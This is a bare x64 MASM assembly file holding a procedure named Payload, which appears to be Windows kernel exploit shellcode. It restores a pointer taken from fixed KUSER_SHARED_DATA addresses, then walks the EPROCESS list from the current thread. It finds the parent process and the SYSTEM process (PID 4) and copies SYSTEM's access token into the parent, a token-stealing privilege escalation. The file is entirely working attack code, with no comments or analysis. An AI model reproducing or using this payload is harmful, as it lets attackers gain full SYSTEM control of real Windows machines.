.code

Payload PROC
	mov rcx, 0fffff78000000800h
	mov rcx, qword ptr [rcx]
	mov rdx, 0fffff78000000808h
	mov rdx, qword ptr [rdx]
	mov qword ptr [rcx], rdx
	mov r9, qword ptr gs:[188h]
	mov r9, qword ptr [r9 + 220h]
	mov r8, qword ptr [r9 + 3e0h]
	mov rax, r9
	loop1:
	mov rax, qword ptr [rax + 2e8h]
	sub rax, 2e8h
	cmp qword ptr [rax + 2e0h], r8
	jne loop1
	mov rcx, rax
	add rcx, 358h
	mov rax, r9
	loop2:
	mov rax, qword ptr [rax + 2e8h]
	sub rax, 2e8h
	cmp qword ptr [rax + 2e0h], 4
	jne loop2
	mov rdx, rax
	add rdx, 358h
	mov rdx, qword ptr [rdx]
	mov qword ptr [rcx], rdx 
	ret
Payload ENDP

END